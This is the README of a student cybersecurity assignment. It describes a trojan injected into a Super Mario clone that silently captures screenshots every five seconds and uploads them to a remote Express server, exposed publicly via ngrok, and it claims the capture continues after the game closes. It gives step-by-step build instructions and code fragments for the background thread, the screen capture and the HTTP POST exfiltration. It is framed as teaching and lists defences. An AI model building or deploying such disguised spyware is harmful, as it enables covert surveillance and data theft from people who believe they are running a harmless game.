# 🎮 Trojan Assignment - Super Mario Game

## 📋 Overview
This is an educational cybersecurity assignment demonstrating how malware can be embedded in legitimate software. The trojan captures screenshots and sends them to a remote server.

## ⚠️ WARNING
This is for **EDUCATIONAL PURPOSES ONLY**. This demonstrates:
- How trojans can be hidden in legitimate applications
- How malware exfiltrates data from victim systems
- The importance of verifying software sources
- Defensive cybersecurity concepts

## 🏗️ What Was Done

### 1. Trojan Implementation
**File**: `source/trojan.py`
- Created a background thread that runs independently
- Captures screenshots every 5 seconds using PIL (Pillow)
- Sends screenshots via HTTP POST to the server
- Continues running even after the game closes

**Injection Point**: `source/main.py` (lines 7-11)
- The trojan starts when the game initializes
- Hidden among normal import statements
- Starts in background, doesn't interfere with game

### 2. Server Infrastructure
**Location**: `server/` directory

Files created:
- `server.js` - Express.js server that receives screenshots
- `index.html` - Real-time dashboard displaying screenshots
- `package.json` - Dependencies

Features:
- Accepts screenshot uploads via POST /upload
- Stores screenshots with timestamps
- Auto-refreshing web interface (every 30 seconds)
- Modern UI showing all captured screenshots

## 🚀 How to Run the Demo

### Step 1: Start the Server
```bash
cd server
npm install  # Already done
powershell -ExecutionPolicy Bypass -Command "npm start"
```

The server will run on `http://localhost:3000`

### Step 2: (Optional) Expose Server with Ngrok
```bash
ngrok http 3000
```

Copy the ngrok URL (e.g., `https://abc123.ngrok.io`)

If using ngrok, update the trojan URL in `source/main.py`:
```python
trojan.start_trojan(server_url="https://YOUR-NGROK-URL/upload", interval=5)
```

### Step 3: Build the Executable
```bash
# From the main directory
pyinstaller --name="SuperMario" --onefile --windowed --add-data "resources;resources" --add-data "source;source" main.py
```

The .exe will be created in the `dist/` folder.

**Note**: Building with --windowed creates a GUI app (no console). Remove this flag if you want to see trojan debug messages during the video recording.

### Step 4: Run the Game
```bash
# Either run from Python:
python main.py

# Or run the built executable:
dist\SuperMario.exe
```

### Step 5: Monitor Screenshots
- Open `http://localhost:3000` (or your ngrok URL)
- You'll see screenshots appearing every 5 seconds
- Close the game - screenshots continue being captured!

## 📹 Video Recording Checklist

For the assignment submission:

1. ✅ **Show the Code**
   - Open `source/main.py` and point out the trojan import (line 7)
   - Open `source/trojan.py` and explain the screenshot capture logic
   - Show where it's initialized in the game

2. ✅ **Build the Executable**
   - Run the PyInstaller command
   - Show the build process completing
   - Show the resulting .exe in the dist/ folder

3. ✅ **Run the Demo**
   - Start the server (show it running)
   - If using ngrok, start ngrok and show the public URL
   - Run the .exe file
   - Show the game starting

4. ✅ **Show Screenshot Capture**
   - Open the web dashboard
   - Show screenshots appearing in real-time
   - Close the game
   - **IMPORTANT**: Show that screenshots continue even after closing the game!

5. ✅ **Public Access (if using ngrok)**
   - Show the ngrok URL
   - Demonstrate that anyone can access the screenshots via the public link

## 🔍 How the Trojan Works

### Background Thread
The trojan uses Python's `threading` module to run in the background:
```python
thread = threading.Thread(target=self.run, daemon=True)
```

The `daemon=True` makes the thread continue even when the main program exits!

### Screenshot Capture
Uses PIL's `ImageGrab.grab()` to capture the entire screen:
```python
screenshot = ImageGrab.grab()
```

### Data Exfiltration
Sends screenshots via HTTP POST:
```python
files = {'screenshot': ('screenshot.png', img_byte_arr, 'image/png')}
response = requests.post(self.server_url, files=files)
```

## 📁 Project Structure
```
mario clone/
├── main.py                  # Entry point
├── source/
│   ├── main.py             # Game initialization (TROJAN INJECTED HERE)
│   ├── trojan.py           # Trojan module (NEW FILE)
│   ├── components/
│   ├── states/
│   └── ...
├── resources/              # Game assets
├── server/
│   ├── server.js           # Screenshot receiver
│   ├── index.html          # Web dashboard
│   ├── package.json
│   └── uploads/            # Stored screenshots
└── dist/
    └── SuperMario.exe      # Built executable
```

## 🎯 Key Learning Points

1. **Code Injection**: How malicious code can be hidden in legitimate applications
2. **Background Execution**: Using threads to run independently of main program
3. **Data Exfiltration**: Sending sensitive data to external servers
4. **Persistence**: The trojan continues even after the app closes
5. **Social Engineering**: Users think they're just running a game

## 🛡️ Defensive Measures (What you learned)

To protect against this type of malware:
- Only download software from trusted sources
- Check code before running (especially open source)
- Use antivirus software
- Monitor network traffic
- Use application sandboxing
- Verify digital signatures

## 📝 Dependencies

**Game**:
- pygame
- pillow (PIL)
- requests

**Server**:
- express
- multer

**Build**:
- pyinstaller

## ✅ Assignment Checklist

- [x] Clone Super Mario game from GitHub
- [x] Create trojan module (screenshot capture)
- [x] Inject trojan into game code
- [x] Create server to receive screenshots
- [x] Create web dashboard with auto-refresh
- [ ] Install PyInstaller
- [ ] Build .exe file
- [ ] Record demonstration video showing:
  - [ ] Code walkthrough
  - [ ] Building process
  - [ ] Running the game
  - [ ] Screenshots being captured
  - [ ] Screenshots continuing after game closes
  - [ ] (Optional) Public ngrok URL access

---

**Educational Note**: This assignment teaches important cybersecurity concepts. Understanding how malware works is essential for defensive security. Never use these techniques for malicious purposes!
